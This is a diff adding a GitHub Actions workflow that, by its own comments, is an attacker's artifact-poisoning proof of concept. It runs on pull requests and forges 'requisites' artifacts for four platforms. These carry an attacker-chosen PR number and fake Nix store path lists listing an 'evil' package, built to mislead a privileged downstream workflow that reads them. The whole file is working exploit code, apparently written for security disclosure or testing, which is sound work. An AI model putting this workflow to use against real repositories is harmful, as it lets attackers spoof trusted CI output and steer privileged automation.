@@ -1,0 +1,49 @@
+name: Nix files edited
+
+on:
+  pull_request:
+
+jobs:
+  forge:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Create attacker-chosen "requisites" artifact contents
+        run: |
+          mkdir -p out
+          # attacker picks the PR number the privileged workflow will comment on
+          echo "1" > out/pr_number.txt
+          for P in x86_64-linux aarch64-linux x86_64-darwin aarch64-darwin; do
+            printf '/nix/store/00000000000000000000000000000000-hello-2.12.1\n/nix/store/11111111111111111111111111111111-zlib-1.3.1\n' > "out/requisites-$P-before.list"
+            printf '/nix/store/00000000000000000000000000000000-hello-2.12.1\n/nix/store/22222222222222222222222222222222-evil-6.6.6\n' > "out/requisites-$P-after.list"
+            if [ "$P" = "x86_64-linux" ]; then cp out/pr_number.txt "out/$P-pr_number.txt"; fi
+          done
+          ls -l out
+
+      - uses: actions/upload-artifact@v4
+        with:
+          name: requisites-x86_64-linux
+          path: |
+            out/pr_number.txt
+            out/requisites-x86_64-linux-before.list
+            out/requisites-x86_64-linux-after.list
+
+      - uses: actions/upload-artifact@v4
+        with:
+          name: requisites-aarch64-linux
+          path: |
+            out/requisites-aarch64-linux-before.list
+            out/requisites-aarch64-linux-after.list
+
+      - uses: actions/upload-artifact@v4
+        with:
+          name: requisites-x86_64-darwin
+          path: |
+            out/requisites-x86_64-darwin-before.list
+            out/requisites-x86_64-darwin-after.list
+
+      - uses: actions/upload-artifact@v4
+        with:
+          name: requisites-aarch64-darwin
+          path: |
+            out/requisites-aarch64-darwin-before.list
+            out/requisites-aarch64-darwin-after.list
